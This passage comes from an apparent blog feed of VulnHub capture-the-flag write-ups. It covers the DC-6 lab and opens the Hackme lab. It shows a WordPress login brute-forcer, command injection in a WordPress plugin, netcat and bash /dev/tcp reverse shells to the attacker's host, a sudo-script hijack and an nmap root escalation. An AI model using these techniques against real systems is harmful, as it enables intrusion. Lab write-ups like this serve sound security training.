class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;green&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Found =&amp;gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;splitlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;checkLogin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;checkLogin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We run the script as shown below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 wpforce.py &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://wordy/wp-login.php &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; passwords.txt 
Found &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; mark:helpdesk01
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the obtained result we find mark’s password, and log in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dc6/screenshot-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dc6/screenshot-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;command-injection&quot;&gt;Command Injection&lt;/h3&gt;

&lt;p&gt;The Plainview Activity Monitor plugin before 20180826 for WordPress is vulnerable to OS command injection via shell metacharacters in the ip parameter of a wp-admin/admin.php?page=plainview_activity_monitor&amp;amp;tab=activity_tools request.&lt;/p&gt;

&lt;p&gt;The POC (Proof of Concept) you can download it &lt;a href=&quot;https://www.exploit-db.com/exploits/45274&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Following the instructions, we need to inject the &lt;strong&gt;IP or integer&lt;/strong&gt; field, start BurpSuite and check if the &lt;strong&gt;Intercept is on&lt;/strong&gt; button is enabled, then we type an IP address and click on &lt;strong&gt;Convert&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dc6/screenshot-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The request was intercepted, then we set up a netcat listener on port 443 and typed the following netcat command as shown bellow.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;192.168.179.187 | nc 192.168.179.1 443 &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dc6/screenshot-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have obtained a shell with low privileges.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443              
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.187] 38106
python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
www-data@dc-6:/var/www/html/wp-admin&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Listing mark’s home directory, graham’s password was found in a note.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@dc-6:/home/mark&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;stuff
www-data@dc-6:/home/mark&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;stuff/things-to-do.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;stuff/things-to-do.txt
Things to &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;:

- Restore full functionality &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the hyperdrive &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;need to speak to Jens&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- Buy present &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Sarah&lt;span class=&quot;s1&quot;&gt;'s farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah'&lt;/span&gt;s replacement
www-data@dc-6:/home/mark&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We switch to the user graham.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@dc-6:/home/mark&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su - graham
su - graham
Password: GSo7isUM1D4

graham@dc-6:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;graham&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;graham&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1001&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;graham&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1005&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;devs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
graham@dc-6:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;User graham has sudo permissions to execute the &lt;strong&gt;/home/jens/backups.sh&lt;/strong&gt;  script as user &lt;strong&gt;jens&lt;/strong&gt; with no password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;graham@dc-6:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;  
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;graham on dc-6:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User graham may run the following commands on dc-6:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jens&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /home/jens/backups.sh
graham@dc-6:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We see that the script has execution privileges for all users, since &lt;strong&gt;graham&lt;/strong&gt; belongs to the (devs) group it was possible to read the bash sciript and even write it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;graham@dc-6:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/jens/backups.sh
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/jens/backups.sh
&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt; 1 jens devs 50 Apr 26  2019 /home/jens/backups.sh

graham@dc-6:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/jens/backups.sh
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/jens/backups.sh
&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-czf&lt;/span&gt; backups.tar.gz /var/www/html
graham@dc-6:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We add the following bash reverse shell to &lt;strong&gt;/home/jens/backups.sh&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;graham@dc-6:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.179.1/443 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /home/jens/backups.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We start a netcat listener on port 443 and execute the following command on the server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;graham@dc-6:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jens /home/jens/backups.sh
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We have obtained a shell as user &lt;strong&gt;jens&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-vlnp&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.1] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.179.187] 38108
jens@dc-6:/home/graham&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The jeans user has permissions to execute the nmap binary as root with no password.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jens@dc-6:/home/graham&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;jens on dc-6:
    env_reset, mail_badpass,
    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin

User jens may run the following commands on dc-6:
    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/nmap
jens@dc-6:/home/graham&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;sudo-permissions&quot;&gt;Sudo Permissions&lt;/h3&gt;

&lt;p&gt;An excellent guide to escalating privileges through this means you can found it in the &lt;a href=&quot;https://gtfobins.github.io/gtfobins/nmap/#sudo&quot;&gt;GTFOBINS&lt;/a&gt; cheat sheet.&lt;/p&gt;

&lt;p&gt;Breaking down the nmap command, we create the &lt;strong&gt;/tmp/shell&lt;/strong&gt; file that contains the instruction to execute an interactive &lt;strong&gt;bash&lt;/strong&gt;, then through the NSE (Nmap Scripting Engine) it execute the &lt;strong&gt;/tmp/shell&lt;/strong&gt; script that invokes a root shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jens@dc-6:/home/graham&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'os.execute(&quot;/bin/bash -i&quot;)'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/shell
&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'os.execute(&quot;/bin/bash -i&quot;)'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /tmp/shell
jens@dc-6:/home/graham&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; /tmp/shell
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; /tmp/shell

Starting Nmap 7.40 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-10 06:53 AEST
NSE: Warning: Loading &lt;span class=&quot;s1&quot;&gt;'/tmp/shell'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; the recommended file extension is &lt;span class=&quot;s1&quot;&gt;'.nse'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
root@dc-6:/home/graham#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We go to the root directory and read the flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@dc-6:/home/graham# &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
root@dc-6:~# &lt;span class=&quot;nb&quot;&gt;ls
ls
&lt;/span&gt;theflag.txt
root@dc-6:~# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;theflag.txt
&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;theflag.txt


Yb        dP 888888 88     88         8888b.   dP&lt;span class=&quot;s2&quot;&gt;&quot;Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;' 
   YP  YP    888888 88ood8 88ood8     8888Y&quot;&lt;/span&gt;   YbodP  88  Y8 888888 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
&lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;have provided feedback, and &lt;span class=&quot;nb&quot;&gt;who &lt;/span&gt;have taken &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;to &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>s4rgaz</name></author><summary type="html">Description: Another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</summary></entry><entry><title type="html">VulnHub - Hackme</title><link href="http://localhost:4000/hackme.html" rel="alternate" type="text/html" title="VulnHub - Hackme" /><published>2022-01-07T00:00:00-05:00</published><updated>2022-01-07T00:00:00-05:00</updated><id>http://localhost:4000/hackme</id><content type="html" xml:base="http://localhost:4000/hackme.html">&lt;p&gt;&lt;strong&gt;Description:&lt;/strong&gt; Is a beginner difficulty level box, the lab was created to mimic real life environment.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; x4bx54&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Operating System:&lt;/strong&gt; Linux&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Aim:&lt;/strong&gt; To get root shell.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/entry/hackme-1,330/&quot;&gt;https://www.vulnhub.com/entry/hackme-1,330/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h2&gt;
&lt;h3 id=&quot;host-discovery&quot;&gt;Host Discovery&lt;/h3&gt;

&lt;p&gt;To discover the target machine a ping scan was done, the script can be downloaded &lt;a href=&quot;https://github.com/s4rgaz/hdiscovery.git&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hdiscovery.py &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 192.168.179.0/24
192.168.179.186 &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; up
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;p&gt;A full TCP/UDP port scan was performed with unicornscan against the target server.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;us &lt;span class=&quot;nt&quot;&gt;-mT&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt; 192.168.179.186 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 3000 &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 3 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; us &lt;span class=&quot;nt&quot;&gt;-mU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p1-65535&lt;/span&gt; 192.168.179.186 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; 3000 &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 3
TCP open                     ssh[   22]         from 192.168.179.186  ttl 64 
TCP open                    http[   80]         from 192.168.179.186  ttl 64 
UDP open                 unknown[35405]         from 192.168.179.186  ttl 64 
UDP open                 unknown[36824]         from 192.168.179.186  ttl 64 
UDP open                 unknown[39810]         from 192.168.179.186  ttl 64 
UDP open                 unknown[41259]         from 192.168.179.186  ttl 64 
UDP open                 unknown[43890]         from 192.168.179.186  ttl 64 
UDP open                 unknown[46917]         from 192.168.179.186  ttl 64 
UDP open                 unknown[50643]         from 192.168.179.186  ttl 64 
UDP open                 unknown[60466]         from 192.168.179.186  ttl 64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;p&gt;In order to get more information about open ports, service detection and script scanning was done with nmap.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,80 192.168.179.186 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 4ubuntu0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 6b:a8:24:d6:09:2f:c9:9a:8e:ab:bc:6e:7d:4e:b9:ad &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 ab:e8:4f:53:38:06:2c:6a:f3:92:e3:97:4a:0e:3e:d1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 32:76:90:b8:7d:fc:a4:32:63:10:cd:67:61:49:d6:c4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.34 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.34 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=UTF-8).
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;A login web page was found, but we don’t have credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/hackme/screenshot-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When running dirb to discover web resources, was found the &lt;strong&gt;/upload&lt;/strong&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirb http://192.168.179.186 &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
...
&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://192.168.179.186/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
